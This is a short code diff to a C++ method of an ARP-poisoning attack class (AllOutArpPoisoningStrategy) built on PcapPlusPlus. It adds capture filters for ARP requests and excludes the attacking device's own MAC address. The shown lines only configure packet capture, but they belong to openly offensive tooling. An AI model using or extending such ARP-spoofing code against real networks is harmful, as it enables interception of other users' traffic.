@@ -4,6 +4,7 @@
 #include "Packet.h"
 #include "PcapFilter.h"
 #include "PcapLiveDevice.h"
+#include "ProtocolType.h"
 #include "RawPacket.h"
 #include "log.h"
 #include <exception>
@@ -63,11 +64,18 @@ void ATK::ARP::AllOutArpPoisoningStrategy::execute() {
     std::promise<void> completionPromise;
     std::future completionFuture = completionPromise.get_future();
 
+    // set filter to mac not to self
+    pcpp::MacAddressFilter deviceMacAdressFilter(device_->getMacAddress(),
+                                                 pcpp::Direction::SRC_OR_DST);
+    pcpp::NotFilter notDeviceMacAdress(&deviceMacAdressFilter);
     pcpp::ArpFilter arpFilter(pcpp::ArpOpcode::ARP_REQUEST);
     pcpp::EtherTypeFilter etherTypeFilter(PCPP_ETHERTYPE_ARP);
+    pcpp::ProtoFilter protoFilter(pcpp::ARP);
     pcpp::AndFilter andFilter{};
     andFilter.addFilter(&arpFilter);
     andFilter.addFilter(&etherTypeFilter);
+    andFilter.addFilter(&protoFilter);
+    andFilter.addFilter(&notDeviceMacAdress);
 
     if (!device_->setFilter(andFilter)) {
         device_->close();
